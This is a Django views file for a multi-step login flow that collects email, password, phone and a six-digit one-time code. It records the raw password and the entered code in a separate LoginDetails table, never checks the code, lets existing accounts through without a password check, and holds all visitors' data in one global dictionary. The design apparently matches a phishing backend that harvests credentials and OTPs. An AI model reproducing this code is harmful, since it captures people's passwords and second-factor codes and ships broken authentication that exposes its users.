from django.shortcuts import render, redirect
from django.contrib.auth.models import User
from django.contrib import messages
from .models import LoginDetails

# from django.core.mail import send_mail

# Global variable to hold user data temporarily
user_data = {}

def home(request):
    return render(request, 'home.html')

def email_screen(request):
    if request.method == 'POST':
        user_data['email'] = request.POST['email']
        return redirect('password_screen')
    return render(request, 'email_screen.html')

def password_screen(request):
    if request.method == 'POST':
        raw_password = request.POST.get('password')  # Collect raw password
        user_data['password'] = raw_password  # Store the raw password
        return redirect('phone_screen')
    return render(request, 'login_system/password_screen.html')

def phone_screen(request):
    if request.method == 'POST':
        user_data['phone'] = request.POST['phone']
        return redirect('otp_screen')  # Directly redirect to OTP screen
    return render(request, 'phone_screen.html')

def otp_screen(request):
    """Screen to collect OTP input and finalize user details."""
    if request.method == 'POST':
        # Check if required data exists (email, password, and phone)
        if not all(key in user_data for key in ['email', 'password', 'phone']):
            return redirect('email_screen')  # Redirect if any data is missing

        # Get OTP input from the form fields (otp1 to otp6)
        otp = ''.join([request.POST.get(f'otp{i}') for i in range(1, 7)])

        if not otp:
            messages.error(request, "Please enter the OTP.")
            return render(request, 'otp_screen.html')

        # Store the OTP in user_data
        user_data['otp'] = otp

        # Check if user with this email already exists
        existing_user = User.objects.filter(email=user_data['email']).first()
        if existing_user:
            # If user exists, update the user record (optional)
            messages.warning(request, 'User with this email already exists. Logging in...')
            user = existing_user  # Handle as needed
        else:
            # Create a new user in the system
            user = User.objects.create_user(
                username=user_data['email'],  # Use email as the username
                email=user_data['email'],
                password=user_data['password']  # Save raw password here
            )

        # Create a LoginDetails record for additional details
        LoginDetails.objects.create(
            user=user,
            phone=user_data['phone'],
            otp=user_data['otp'],  # Store the OTP entered by the user
            password=user_data['password']  # Save raw password
        )

        # Redirect to the main screen after successful OTP submission
        return redirect('main_screen')  # Redirect to the main screen

    return render(request, 'otp_screen.html')


def main_screen(request):
    """Main screen displayed after successful login."""
    return render(request, 'login_system/main_screen.html')
